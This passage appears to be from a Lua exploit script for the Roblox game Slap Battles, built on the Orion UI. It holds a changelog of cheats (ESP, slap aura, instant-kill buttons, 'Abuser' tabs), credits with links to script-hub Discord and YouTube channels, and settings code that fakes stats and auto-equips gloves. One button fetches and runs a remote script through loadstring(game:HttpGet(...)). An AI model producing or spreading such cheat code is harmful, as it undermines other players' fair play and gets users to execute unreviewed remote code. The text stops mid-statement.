[+] Added Drawing Post ESP Toggle
[+] Added Barzil Portal ESP Toggle
[+] Added asset/?id=12357588065 ESP Toggle
[+] Added Chair ESP Toggle
[+] Added Plate ESP Toggle
[+] Added Cheese ESP Toggle
[x] Changed Recall Answer Total Gloves
[x] Changed Others Scripts
[+] Added Abuser Tab
[+] Added All Slap Gloves Abuser Buttons
[+] Added All Badge Gloves Abuser Buttons
[+] Added All Other Gloves Abuser Buttons
[+] Added FAQ And Error Fixes In Abuser Tab
[x] Fixed Edgelord Admin Glove F Button
[-] Removed Config Settings Section And Buttons
[x] Fixed Give All Badge Gloves Button (Doesnt Give Unequipable Gloves)
[-] Removed Kick Others (Exploiters Only) Button
[+] Added Slap Aura Toggle
[x] Fixed Equip Slap Gloves
[x] Fixed Equip Badge Gloves
-ICE TRIALS- PLACE
[+] Added Other Tab
[+] Added ESP Real Glass
[+] Added ESP Fake Glass
[+] Added ESP Ice Essence
-BARZIL- PLACE
[x] Fixed Auto Get Fan Glove
-CLOCK- PLACE
-TOH- PLACE
[x] Changed Auto Get Clock Glove (It Was TOH Before)
[x] Changed Auto Get TOH Glove (It Was Clock Before)
-SLAP CART- PLACE
[+] Added Infinite Yield (Use ;fly) Button
[+] Added Remove All Traps Button
[+] Added Parapragh Type Traps Shower
-THE SUCTION TRIALS- PLACE
[+] Added Instant Win Button
-SHATTERED REALITY- PLACE
[+] Added Teleport To Normal Portal Button (Stage 1)
[+] Added Teleport To Normal Portal Button (Stage 2)
[+] Added Teleport To Normal Portal Button (Stage 3)
[+] Added Teleport To Dark Portal Button (Stage 1)
[+] Added Teleport To Dark Portal Button (Stage 2)
[+] Added Instant Kill All Small Shadow NPC's Button
[+] Added Instant Kill Boss Shadow NPC R15 (Damage Him 2 Times Before Doing) Button
[+] Added Instant Kill Boss Shadow NPC R6 (Damage Him 2 Times Before Doing) Button

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

-- Version 1.9.5
Tab:AddParagraph("V. 1.9.5:", [[
[+] Added Pyromania Slap Glove Equip Textbox
[+] Added Auto Ability/Slap People Defense Mastery Toggle
[x] Fixed Equip Sledge Hammer Button
[+] Added Save Config Button
[+] Added Reset Config Button
[+] Added All Badge Glove Giver Button
[+] Added Custom Milkman Glove Button
[x] Changed All Notifications
[x] Fixed Auto Get Hexa Glove (The White Place)

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

-- Version 1.8.6
Tab:AddParagraph("V. 1.8.6:", [[
[+] Added Changelogs Tab
[+] Added Changelogs V. Paragraph
[+] Added Slasher Badge Glove Equip
[+] Added Section Get Slasher Glove
[+] Added Teleport To Slasher Door Button
[+] Added Someone Using Run Glove? Button
[+] Added Slasher Door ESP Toggle
[+] Added Equip Slasher Glove Textbox
[+] Added Teleport To Friday The 13th (1) Button
[+] Added Teleport To Friday The 13th (2) Button
[+] Added Support To Friday the 13th Place
[+] Added Main Tab
[+] Added Light Settings Section
[+] Added Full Bright Toggle
[+] Added Enable Camera (IY) Button
[+] Added Remove Blood Fog Button
[+] Added Lantern Brightness Slider
[+] Added Lantern Range Slider
[+] Added Apply Lantern Settings Button
[+] Added Equip Settings Section
[+] Added Click Plant 1 Button
[+] Added Click Plant 2 Button
[+] Added Click Plant 3 Button
[+] Added Click Plant 4 Button
[+] Added Click Plant 5 Button
[+] Added Click Plant 6 Button
[+] Added Equip Shovel Button
[+] Added Equip Sledge Hammer Button
[+] Added Puzzle Settings Section
[+] Added Auto Solve Painting Puzzle Toggle
[+] Added Boss Settings Section
[+] Added Instant Kill Boss Button

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

-- CREDITS

local Tab = Window:MakeTab({
    Name = "Credits",
    Icon = "rbxassetid://7743875759",
    PremiumOnly = false
})

-- Credits Users
Section = Tab:AddSection({
    Name = "Credits Users"
})

Tab:AddLabel("Incognito Scripts - (Youtube, Discord)")
Tab:AddLabel("Nexer - (Youtube, Discord)")
Tab:AddLabel("BaconScripter - Youtube")
Tab:AddLabel("DonjoSx - (Youtube, Discord)")
Tab:AddLabel("Scripter - (Youtube, Discord)")
Tab:AddLabel("Herkle - (Youtube, Discord)")
Tab:AddLabel("Kizzy - (Youtube, Discord)")
Tab:AddLabel("SPRG - (Youtube, Discord, Roblox Group)")

-- Helpers
Section = Tab:AddSection({
    Name = "Helpers"
})

Tab:AddLabel("Verse - turbo0617_14251")
Tab:AddLabel("4̲̅0̲̅4̲̅]CσяяυρтєD[̲̅4̲̅0̲̅4 - nousernamefounded")
Tab:AddLabel("PIXEL_FAN - zahin0028")
Tab:AddLabel("Hitman - bobby04774")
Tab:AddLabel("R̸o̴b̵S̸c̴r̷i̸p̷t̷e̸r̶ - rob_bloxy")

-- Links
Section = Tab:AddSection({
    Name = "Links"
})

Tab:AddButton({
    Name = "Nexer (Youtube)",
    Callback = function()
        setclipboard("https://www.youtube.com/@nexer1234")
    end
})

Tab:AddButton({
    Name = "Nexer (Discord)",
    Callback = function()
        setclipboard("https://discord.gg/sxbN66xt")
    end
})

Tab:AddButton({
    Name = "Scripter (Youtube)",
    Callback = function()
        setclipboard("https://www.youtube.com/@Scripter-Coder")
    end
})

Tab:AddButton({
    Name = "Scripter (Discord)",
    Callback = function()
        setclipboard("https://discord.gg/k8vJHZM6")
    end
})

Tab:AddButton({
    Name = "BaconScripter (Youtube)",
    Callback = function()
        setclipboard("https://www.youtube.com/@BaconScripters")
    end
})

Tab:AddButton({
    Name = "BaconScripter (Discord)",
    Callback = function()
        setclipboard("https://discord.gg/29zcq8NWBC")
    end
})

Tab:AddButton({
    Name = "Incognito Scripts (Youtube)",
    Callback = function()
        setclipboard("https://www.youtube.com/@IncognitoScripts")
    end
})

Tab:AddButton({
    Name = "Incognito Scripts (Discord)",
    Callback = function()
        setclipboard("https://discord.gg/kTKgSSQ88h")
    end
})

Tab:AddButton({
    Name = "DonjoSx (Youtube)",
    Callback = function()
        setclipboard("https://www.youtube.com/@TheOriginalDonjoSx")
    end
})

Tab:AddButton({
    Name = "DonjoSx (Discord)",
    Callback = function()
        setclipboard("https://discord.gg/xpvq9heeRm")
    end
})

Tab:AddButton({
    Name = "SRPG (Youtube)",
    Callback = function()
        setclipboard("https://www.youtube.com/@TheSPRG")
    end
})

Tab:AddButton({
    Name = "SRPG (Discord)",
    Callback = function()
        setclipboard("https://discord.gg/emvU4HuQFk")
    end
})

Tab:AddButton({
    Name = "Herkle (Youtube)",
    Callback = function()
        setclipboard("https://www.youtube.com/@herklehub")
    end
})

Tab:AddButton({
    Name = "Herkle (Discord)",
    Callback = function()
        setclipboard("https://discord.gg/herkle")
    end
})

Tab:AddButton({
    Name = "Kizzy (Youtube)",
    Callback = function()
        setclipboard("https://www.youtube.com/@kizzylmfao")
    end
})

Tab:AddButton({
    Name = "Kizzy (Discord)",
    Callback = function()
        setclipboard("https://discord.com/JkQFehEKRK")
    end
})

-- SETTINGS
local Tab = Window:MakeTab({
    Name = "Settings",
    Icon = "rbxassetid://7734053495",
    PremiumOnly = false
})

-- Section: Value Changer
Section = Tab:AddSection({
    Name = "Value Changer"
})

Tab:AddTextbox({
    Name = "How Many Slaps? (Visual)",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        local slapNumber = tonumber(Value)
        if slapNumber and slapNumber > 0 then
            SlapChanger = slapNumber
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Type a correct number (greater than 0)!",
                Image = "rbxassetid://7733975185",
                Time = 3
            })
        end
    end
})

Tab:AddButton({
    Name = "Set Slaps (Visual)",
    Callback = function()
        if SlapChanger then
            game.Players.LocalPlayer.leaderstats.Slaps.Value = SlapChanger
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Please enter a valid number of slaps!",
                Image = "rbxassetid://7733975185",
                Time = 3
            })
        end
    end
})

Tab:AddTextbox({
    Name = "How Many Null Shards? (Visual)",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        local nullshardNumber = tonumber(Value)
        if nullshardNumber and nullshardNumber >= 0 then
            getgenv().nullshardChanger = tostring(nullshardNumber)  -- Convert to string since it's a StringValue

        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Type a correct number (0 or greater)!",
                Image = "rbxassetid://7733975185",
                Time = 3
            })
        end
    end
})

Tab:AddButton({
    Name = "Set Null Shards (Visual)",
    Callback = function()
        if getgenv().nullshardChanger then
            local playerName = game.Players.LocalPlayer.Name
            
            -- Wait for ReplicatedStorage to load
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            
            -- Check if PlayerData folder exists
            local playerData = ReplicatedStorage:WaitForChild("PlayerData", 5)
            if not playerData then

                return
            end
            
            -- Check if player folder exists
            local playerFolder = playerData:WaitForChild(playerName, 5)
            if not playerFolder then

                return
            end
            
            -- Check if NullShards StringValue exists
            local nullShardsValue = playerFolder:WaitForChild("NullShards", 5)
            if not nullShardsValue then

                return
            end
            
            -- Verify it's a StringValue
            if nullShardsValue.ClassName ~= "StringValue" then

                return
            end
            
            -- Set the value
            local oldValue = nullShardsValue.Value
            nullShardsValue.Value = getgenv().nullshardChanger
            
            
            print("[Null Shards] Changed from " .. oldValue .. " to " .. getgenv().nullshardChanger)
            
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Please enter a valid number first!",
                Image = "rbxassetid://7733975185",
                Time = 3
            })
        end
    end
})

-- Section: Badge Giver
Section = Tab:AddSection({
    Name = "Badge Giver"
})

Tab:AddButton({
    Name = "Give All Badges (Visual)",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/getallbadges_fake/main/main.lua'))()
    end
})

-- Variables
local nametagText = ""
local autoNametag = false
local player = game.Players.LocalPlayer

-- Textbox for nametag
Tab:AddTextbox({
    Name = "Type Ur Own Any Nametag",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        nametagText = Value
    end
})

-- Button to apply nametag once
Tab:AddButton({
    Name = "Change Nametag",
    Callback = function()
        if nametagText == "" then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Please enter text in the textbox first!",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
            return
        end
        
        -- Find and update nametag
        local character = player.Character
        if character then
            local nametag = character:FindFirstChild("Head") and character.Head:FindFirstChild("Nametag")
            if nametag then
                local topLabel = nametag:FindFirstChild("Labels") and nametag.Labels:FindFirstChild("TopLabel")
                if topLabel then
                    topLabel.Text = nametagText
                    OrionLib:MakeNotification({
                        Name = "Success",
                        Content = "Nametag changed to: " .. nametagText,
                        Image = "rbxassetid://4483345998",
                        Time = 3
                    })
                else
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "TopLabel not found!",
                        Image = "rbxassetid://7743878857",
                        Time = 3
                    })
                end
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Nametag not found!",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            end
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Character not found!",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- Toggle for auto nametag
Tab:AddToggle({
    Name = "Auto Change Nametag",
    Default = false,
    Callback = function(Value)
        autoNametag = Value
        if Value then
            -- Start auto nametag loop
            task.spawn(function()
                while autoNametag do
                    if nametagText ~= "" then
                        local character = player.Character
                        if character then
                            local nametag = character:FindFirstChild("Head") and character.Head:FindFirstChild("Nametag")
                            if nametag then
                                local topLabel = nametag:FindFirstChild("Labels") and nametag.Labels:FindFirstChild("TopLabel")
                                if topLabel then
                                    topLabel.Text = nametagText
                                end
                            end
                        end
                    end
                    task.wait(0.01)
                end
            end)
        end
    end
})

-- Auto reapply nametag when character respawns
player.CharacterAdded:Connect(function(character)
    if autoNametag and nametagText ~= "" then
        -- Wait for character to fully load
        wait(2)
        local nametag = character:FindFirstChild("Head") and character.Head:FindFirstChild("Nametag")
        if nametag then
            local topLabel = nametag:FindFirstChild("Labels") and nametag.Labels:FindFirstChild("TopLabel")
            if topLabel then
                topLabel.Text = nametagText
            end
        end
    end
end)

Tab:AddTextbox({
    Name = "Equip Slap Glove",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        local gloves = {
            Default = workspace.Lobby["Default"],
            Dual = workspace.Lobby["Dual"],
            Diamond = workspace.Lobby["Diamond"],
            ZZZZZZZ = workspace.Lobby["ZZZZZZZ"],
            Extended = workspace.Lobby["Extended"],
            Brick = workspace.Lobby["Brick"],
            Snow = workspace.Lobby["Snow"],
            Pull = workspace.Lobby["Pull"],
            Flash = workspace.Lobby["Flash"],
            Stilts = workspace.Lobby["Stilts"],
            Spring = workspace.Lobby["Spring"],
            Swapper = workspace.Lobby["Swapper"],
            Screwdriver = workspace.Lobby["Screwdriver"],
            Bull = workspace.Lobby["Bull"],
            Dice = workspace.Lobby["Dice"],
            Ghost = workspace.Lobby["Ghost"],
            Thanos = workspace.Lobby["Thanos"],
            Stun = workspace.Lobby["Stun"],
            ["L.O.L.B.O.M.B"] = workspace.Lobby["L.O.L.B.O.M.B"],
            ["Za Hando"] = workspace.Lobby["Za Hando"],
            Fort = workspace.Lobby["Fort"],
            Magnet = workspace.Lobby["Magnet"],
            Pusher = workspace.Lobby["Pusher"],
            Anchor = workspace.Lobby["Anchor"],
            Space = workspace.Lobby["Space"],
            Boomerang = workspace.Lobby["Boomerang"],
            Speedrun = workspace.Lobby["Speedrun"],
            Mail = workspace.Lobby["Mail"],
            ["T H I C K"] = workspace.Lobby["T H I C K"],
            Golden = workspace.Lobby["Golden"],
            Squid = workspace.Lobby["Squid"],
            MR = workspace.Lobby["MR"],
            Hive = workspace.Lobby["Hive"],
            Reaper = workspace.Lobby["Reaper"],
            Baby = workspace.Lobby["Baby"],
            Replica = workspace.Lobby["Replica"],
            Mace = workspace.Lobby["Mace"],
            Defense = workspace.Lobby["Defense"],
            Killstreak = workspace.Lobby["Killstreak"],
            Reverse = workspace.Lobby["Reverse"],
            Shukuchi = workspace.Lobby["Shukuchi"],
            Duelist = workspace.Lobby["Duelist"],
            woah = workspace.Lobby["woah"],
            Ice = workspace.Lobby["Ice"],
            Gummy = workspace.Lobby["Gummy"],
            Adios = workspace.Lobby["Adios"],
            Blocked = workspace.Lobby["Blocked"],
            Divert = workspace.Lobby["Divert"],
            Engineer = workspace.Lobby["Engineer"],
            Rocky = workspace.Lobby["Rocky"],
            Coil = workspace.Lobby["Coil"],
            Conveyor = workspace.Lobby["Conveyor"],
            Balloony = workspace.Lobby["Balloony"],
            Phantom = workspace.Lobby["Phantom"],
            Leafblower = workspace.Lobby["Leafblower"],
            ["el gato"] = workspace.Lobby["el gato"],
            Wormhole = workspace.Lobby["Wormhole"],
            Shackle = workspace.Lobby["Shackle"],
            Flick = workspace.Lobby["Flick"],
            STOP = workspace.Lobby["STOP"],
            Equalizer = workspace.Lobby["Equalizer"],
            Track = workspace.Lobby["Track"],
            Stalker = workspace.Lobby["Stalker"],
            Retribution = workspace.Lobby["Retribution"],
            Prop = workspace.Lobby["Prop"],
            Shield = workspace.Lobby["Shield"],
            Clover = workspace.Lobby["Clover"],
            Booster = workspace.Lobby["Booster"],
            Chainsaw = workspace.Lobby["Chainsaw"],
            ["Ping Pong"] = workspace.Lobby["Ping Pong"],
            Trifecta = workspace.Lobby["Trifecta"],
            Baller = workspace.Lobby["Baller"],
            Architect = workspace.Lobby["Architect"],
            ["Home Run"] = workspace.Lobby["Home Run"],
            Friction = workspace.Lobby["Friction"],
            Whirlwind = workspace.Lobby["Whirlwind"],
            Disc = workspace.Lobby["Disc"],
            Slicer = workspace.Lobby["Slicer"],
            Excavator = workspace.Lobby["Excavator"],
            Nightmare = workspace.Lobby["Nightmare"],
            Pylon = workspace.Lobby["Pylon"],
            Thor = workspace.Lobby["Thor"],
            Pocket = workspace.Lobby["Pocket"],
            Grapple = workspace.Lobby["Grapple"],
            Cloud = workspace.Lobby["Cloud"],
            Gravity = workspace.Lobby["Gravity"],
            Parry = workspace.Lobby["Parry"],
            Jebaited = workspace.Lobby["Jebaited"],
            Meteor = workspace.Lobby["Meteor"],
            Oven = workspace.Lobby["Oven"],
            ["Guardian Angel"] = workspace.Lobby["Guardian Angel"],
            Sun = workspace.Lobby["Sun"],
            Ferryman = workspace.Lobby["Ferryman"],
            Blackhole = workspace.Lobby["Blackhole"],
            Walrus = workspace.Lobby["Walrus"],
            Blink = workspace.Lobby["Blink"],
            Tableflip = workspace.Lobby["Tableflip"],
            Slapstick = workspace.Lobby["Slapstick"],
            Beatdown = workspace.Lobby["Beatdown"],
            Chicken = workspace.Lobby["Chicken"],
            BONK = workspace.Lobby["BONK"],
            Grenadier = workspace.Lobby["Grenadier"],
            Sbeve = workspace.Lobby["Sbeve"],
            Golem = workspace.Lobby["Golem"],
            Doomsday = workspace.Lobby["Doomsday"],
            Grab = workspace.Lobby["Grab"],
            UFO = workspace.Lobby["UFO"],
            Demolition = workspace.Lobby["Demolition"],
            Beachball = workspace.Lobby["Beachball"],
            Shotgun = workspace.Lobby["Shotgun"],
            ["64"] = workspace.Lobby["64"],
            Roguelike = workspace.Lobby["Roguelike"],
            Barrel = workspace.Lobby["Barrel"],
            Lawnmower = workspace.Lobby["Lawnmower"],
            Virus = workspace.Lobby["Virus"],
            Smiler = workspace.Lobby["Smiler"],
            Butcher = workspace.Lobby["Butcher"],
            Infinity = workspace.Lobby["Infinity"],
            Aggro = workspace.Lobby["Aggro"],
            Soul = workspace.Lobby["Soul"],
            ["R/C"] = workspace.Lobby["R/C"],
            Mushroom = workspace.Lobby["Mushroom"],
            Scuba = workspace.Lobby["Scuba"],
            Pyromania = workspace.Lobby["Pyromania"],
            Automaton = workspace.Lobby["Automaton"],
            ["God's Hand"] = workspace.Lobby["God's Hand"],
            ["The Flex"] = workspace.Lobby["The Flex"]
        }

        local glove = gloves[Value]

        if glove and glove.ClickDetector then
            fireclickdetector(glove.ClickDetector)
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Type Name Correct/Incorrect Name",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddTextbox({
    Name = "Equip Badge Glove",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        if Value == "MEGAROCK" then
            fireclickdetector(workspace.Lobby["MEGAROCK"].ClickDetector)
        elseif Value == "Plague" then
            fireclickdetector(workspace.Lobby["Plague"].ClickDetector)
        elseif Value == "Hallow Jack" then
            fireclickdetector(workspace.Lobby["Hallow Jack"].ClickDetector)
        elseif Value == "[REDACTED]" then
            fireclickdetector(workspace.Lobby["[REDACTED]"].ClickDetector)
        elseif Value == "bus" then
            fireclickdetector(workspace.Lobby["bus"].ClickDetector)
        elseif Value == "Mitten" then
            fireclickdetector(workspace.Lobby["Mitten"].ClickDetector)
        elseif Value == "Phase" then
            fireclickdetector(workspace.Lobby["Phase"].ClickDetector)
        elseif Value == "Warp" then
            fireclickdetector(workspace.Lobby["Warp"].ClickDetector)
        elseif Value == "Bomb" then
            fireclickdetector(workspace.Lobby["Bomb"].ClickDetector)
        elseif Value == "Bubble" then
            fireclickdetector(workspace.Lobby["Bubble"].ClickDetector)
        elseif Value == "Jet" then
            fireclickdetector(workspace.Lobby["Jet"].ClickDetector)
        elseif Value == "Shard" then
            fireclickdetector(workspace.Lobby["Shard"].ClickDetector)
        elseif Value == "CULT" then
            fireclickdetector(workspace.Lobby["CULT"].ClickDetector)
        elseif Value == "bob" then
            fireclickdetector(workspace.Lobby["bob"].ClickDetector)
        elseif Value == "buddies" then
            fireclickdetector(workspace.Lobby["buddies"].ClickDetector)
        elseif Value == "Moon" then
            fireclickdetector(workspace.Lobby["Moon"].ClickDetector)
        elseif Value == "Jupiter" then
            fireclickdetector(workspace.Lobby["Jupiter"].ClickDetector)
        elseif Value == "Spy" then
            fireclickdetector(workspace.Lobby["Spy"].ClickDetector)
        elseif Value == "Detonator" then
            fireclickdetector(workspace.Lobby["Detonator"].ClickDetector)
        elseif Value == "Rage" then
            fireclickdetector(workspace.Lobby["Rage"].ClickDetector)
        elseif Value == "Trap" then
            fireclickdetector(workspace.Lobby["Trap"].ClickDetector)
        elseif Value == "Orbit" then
            fireclickdetector(workspace.Lobby["Orbit"].ClickDetector)
        elseif Value == "Hybrid" then
            fireclickdetector(workspace.Lobby["Hybrid"].ClickDetector)
        elseif Value == "Slapple" then
            fireclickdetector(workspace.Lobby["Slapple"].ClickDetector)
        elseif Value == "Disarm" then
            fireclickdetector(workspace.Lobby["Disarm"].ClickDetector)
        elseif Value == "Dominance" then
            fireclickdetector(workspace.Lobby["Dominance"].ClickDetector)
        elseif Value == "Link" then
            fireclickdetector(workspace.Lobby["Link"].ClickDetector)
        elseif Value == "Chain" then
            fireclickdetector(workspace.Lobby["Chain"].ClickDetector)
        elseif Value == "Rattlebones" then
            fireclickdetector(workspace.Lobby["Rattlebones"].ClickDetector)
        elseif Value == "Charge" then
            fireclickdetector(workspace.Lobby["Charge"].ClickDetector)
        elseif Value == "Tycoon" then
            fireclickdetector(workspace.Lobby["Tycoon"].ClickDetector)
        elseif Value == "Confusion" then
            fireclickdetector(workspace.Lobby["Confusion"].ClickDetector)
        elseif Value == "Glitch" then
            fireclickdetector(workspace.Lobby["Glitch"].ClickDetector)
        elseif Value == "Snowball" then
            fireclickdetector(workspace.Lobby["Snowball"].ClickDetector)
        elseif Value == "Elude" then
            fireclickdetector(workspace.Lobby["Elude"].ClickDetector)
        elseif Value == "RNG" then
            fireclickdetector(workspace.Lobby["RNG"].ClickDetector)
        elseif Value == "fish" then
            fireclickdetector(workspace.Lobby["fish"].ClickDetector)
        elseif Value == "🗿" then
            fireclickdetector(workspace.Lobby["🗿"].ClickDetector)
        elseif Value == "Obby" then
            fireclickdetector(workspace.Lobby["Obby"].ClickDetector)
        elseif Value == "Voodoo" then
            fireclickdetector(workspace.Lobby["Voodoo"].ClickDetector)
        elseif Value == "Goofy" then
            fireclickdetector(workspace.Lobby["Goofy"].ClickDetector)
        elseif Value == "Leash" then
            fireclickdetector(workspace.Lobby["Leash"].ClickDetector)
        elseif Value == "Flamarang" then
            fireclickdetector(workspace.Lobby["Flamarang"].ClickDetector)
        elseif Value == "Kinetic" then
            fireclickdetector(workspace.Lobby["Kinetic"].ClickDetector)
        elseif Value == "Berserk" then
            fireclickdetector(workspace.Lobby["Berserk"].ClickDetector)
        elseif Value == "Sparky" then
            fireclickdetector(workspace.Lobby["Sparky"].ClickDetector)
        elseif Value == "Boogie" then
            fireclickdetector(workspace.Lobby["Boogie"].ClickDetector)
        elseif Value == "Recall" then
            fireclickdetector(workspace.Lobby["Recall"].ClickDetector)
        elseif Value == "Quake" then
            fireclickdetector(workspace.Lobby["Quake"].ClickDetector)
        elseif Value == "Psycho" then
            fireclickdetector(workspace.Lobby["Psycho"].ClickDetector)
        elseif Value == "Kraken" then
            fireclickdetector(workspace.Lobby["Kraken"].ClickDetector)
        elseif Value == "Counter" then
            fireclickdetector(workspace.Lobby["Counter"].ClickDetector)
        elseif Value == "Hammer" then
            fireclickdetector(workspace.Lobby["Hammer"].ClickDetector)
        elseif Value == "rob" then
            fireclickdetector(workspace.Lobby["rob"].ClickDetector)
        elseif Value == "Rhythm" then
            fireclickdetector(workspace.Lobby["Rhythm"].ClickDetector)
        elseif Value == "Rojo" then
            fireclickdetector(workspace.Lobby["Rojo"].ClickDetector)
        elseif Value == "Hitman" then
            fireclickdetector(workspace.Lobby["Hitman"].ClickDetector)
        elseif Value == "Retro" then
            fireclickdetector(workspace.Lobby["Retro"].ClickDetector)
        elseif Value == "Null" then
            fireclickdetector(workspace.Lobby["Null"].ClickDetector)
        elseif Value == "Lure" then
            fireclickdetector(workspace.Lobby["Lure"].ClickDetector)
        elseif Value == "Tinkerer" then
            fireclickdetector(workspace.Lobby["Tinkerer"].ClickDetector)
        elseif Value == "Necromancer" then
            fireclickdetector(workspace.Lobby["Necromancer"].ClickDetector)
        elseif Value == "Alchemist" then
            fireclickdetector(workspace.Lobby["Alchemist"].ClickDetector)
        elseif Value == "Druid" then
            fireclickdetector(workspace.Lobby["Druid"].ClickDetector)
        elseif Value == "Jester" then
            fireclickdetector(workspace.Lobby["Jester"].ClickDetector)
        elseif Value == "Scythe" then
            fireclickdetector(workspace.Lobby["Scythe"].ClickDetector)
        elseif Value == "Santa" then
            fireclickdetector(workspace.Lobby["Santa"].ClickDetector)
        elseif Value == "Iceskate" then
            fireclickdetector(workspace.Lobby["Iceskate"].ClickDetector)
        elseif Value == "Blasphemy" then
            fireclickdetector(workspace.Lobby["Blasphemy"].ClickDetector)
        elseif Value == "Pan" then
            fireclickdetector(workspace.Lobby["Pan"].ClickDetector)
        elseif Value == "Admin" then
            fireclickdetector(workspace.Lobby["Admin"].ClickDetector)
        elseif Value == "Joust" then
            fireclickdetector(workspace.Lobby["Joust"].ClickDetector)
        elseif Value == "Firework" then
            fireclickdetector(workspace.Lobby["Firework"].ClickDetector)
        elseif Value == "Run" then
            fireclickdetector(workspace.Lobby["Run"].ClickDetector)
        elseif Value == "Glovel" then
            fireclickdetector(workspace.Lobby["Glovel"].ClickDetector)
        elseif Value == "Divebomb" then
            fireclickdetector(workspace.Lobby["Divebomb"].ClickDetector)
        elseif Value == "Lamp" then
            fireclickdetector(workspace.Lobby["Lamp"].ClickDetector)
        elseif Value == "Knockoff" then
            fireclickdetector(workspace.Lobby["Knockoff"].ClickDetector)
        elseif Value == "Frostbite" then
            fireclickdetector(workspace.Lobby["Frostbite"].ClickDetector)
        elseif Value == "Plank" then
            fireclickdetector(workspace.Lobby["Plank"].ClickDetector)
        elseif Value == "Spoonful" then
            fireclickdetector(workspace.Lobby["Spoonful"].ClickDetector)
        elseif Value == "the schlob" then
            fireclickdetector(workspace.Lobby["the schlob"].ClickDetector)
        elseif Value == "Siphon" then
            fireclickdetector(workspace.Lobby["Siphon"].ClickDetector)
        elseif Value == "Wrench" then
            fireclickdetector(workspace.Lobby["Wrench"].ClickDetector)
        elseif Value == "Hunter" then
            fireclickdetector(workspace.Lobby["Hunter"].ClickDetector)
        elseif Value == "Relude" then
            fireclickdetector(workspace.Lobby["Relude"].ClickDetector)
        elseif Value == "Avatar" then
            fireclickdetector(workspace.Lobby["Avatar"].ClickDetector)
        elseif Value == "Water" then
            fireclickdetector(workspace.Lobby["Water"].ClickDetector)
        elseif Value == "Fan" then
            fireclickdetector(workspace.Lobby["Fan"].ClickDetector)
        elseif Value == "Boxer" then
            fireclickdetector(workspace.Lobby["Boxer"].ClickDetector)
        elseif Value == "MATERIALIZE" then
            fireclickdetector(workspace.Lobby["MATERIALIZE"].ClickDetector)
        elseif Value == "Bind" then
            fireclickdetector(workspace.Lobby["Bind"].ClickDetector)
        elseif Value == "Poltergeist" then
            fireclickdetector(workspace.Lobby["Poltergeist"].ClickDetector)
        elseif Value == "Clock" then
            fireclickdetector(workspace.Lobby["Clock"].ClickDetector)
        elseif Value == "Untitled Tag Glove" then
            fireclickdetector(workspace.Lobby["Untitled Tag Glove"].ClickDetector)
        elseif Value == "Pillow" then
            fireclickdetector(workspace.Lobby["Pillow"].ClickDetector)
        elseif Value == "Angler" then
            fireclickdetector(workspace.Lobby["Angler"].ClickDetector)
        elseif Value == "Jerry" then
            fireclickdetector(workspace.Lobby["Jerry"].ClickDetector)
        elseif Value == "Snowroller" then
            fireclickdetector(workspace.Lobby["Snowroller"].ClickDetector)
        elseif Value == "Draw4" then
            fireclickdetector(workspace.Lobby["Draw4"].ClickDetector)
        elseif Value == "Mouse" then
            fireclickdetector(workspace.Lobby["Mouse"].ClickDetector)
        elseif Value == "Swordfighter" then
            fireclickdetector(workspace.Lobby["Swordfighter"].ClickDetector)
        elseif Value == "Tank" then
            fireclickdetector(workspace.Lobby["Tank"].ClickDetector)
        elseif Value == "Eggler" then
            fireclickdetector(workspace.Lobby["Eggler"].ClickDetector)
        elseif Value == "Slender" then
            fireclickdetector(workspace.Lobby["Slender"].ClickDetector)
        elseif Value == "Swashbuckler" then
            fireclickdetector(workspace.Lobby["Swashbuckler"].ClickDetector)
        elseif Value == "Silly" then
            fireclickdetector(workspace.Lobby["Silly"].ClickDetector)
        elseif Value == "Slasher" then
            fireclickdetector(workspace.Lobby["Slasher"].ClickDetector)
        elseif Value == "Car Keys" then
            fireclickdetector(workspace.Lobby["Car Keys"].ClickDetector)
        elseif Value == "Suction" then
            fireclickdetector(workspace.Lobby["Suction"].ClickDetector)
        elseif Value == "Reflect" then
            fireclickdetector(workspace.Lobby["Reflect"].ClickDetector)
        elseif Value == "Dave" then
            fireclickdetector(workspace.Lobby["Dave"].ClickDetector)
        elseif Value == "mortis" then
            fireclickdetector(workspace.Lobby["mortis"].ClickDetector)
        elseif Value == "Bounty" then
            fireclickdetector(workspace.Lobby["Bounty"].ClickDetector)
        elseif Value == "Debug" then
            fireclickdetector(workspace.Lobby["Debug"].ClickDetector)
        elseif Value == "Paint" then
            fireclickdetector(workspace.Lobby["Paint"].ClickDetector)
        elseif Value == "Plate" then
            fireclickdetector(workspace.Lobby["Plate"].ClickDetector)
        elseif Value == "Lag" then
            fireclickdetector(workspace.Lobby["Lag"].ClickDetector)
        elseif Value == "Harvester" then
            fireclickdetector(workspace.Lobby["Harvester"].ClickDetector)
        elseif Value == "Riftshot" then
            fireclickdetector(workspace.Lobby["Riftshot"].ClickDetector)
        elseif Value == "Conker" then
            fireclickdetector(workspace.Lobby["Conker"].ClickDetector)
        elseif Value == "Wheelchair" then
            fireclickdetector(workspace.Lobby["Wheelchair"].ClickDetector)
        elseif Value == "Elf" then
            fireclickdetector(workspace.Lobby["Elf"].ClickDetector)
        elseif Value == "Shopkeeper" then
            fireclickdetector(workspace.Lobby["Shopkeeper"].ClickDetector)
        else
            OrionLib:MakeNotification({
                Name = "Error",
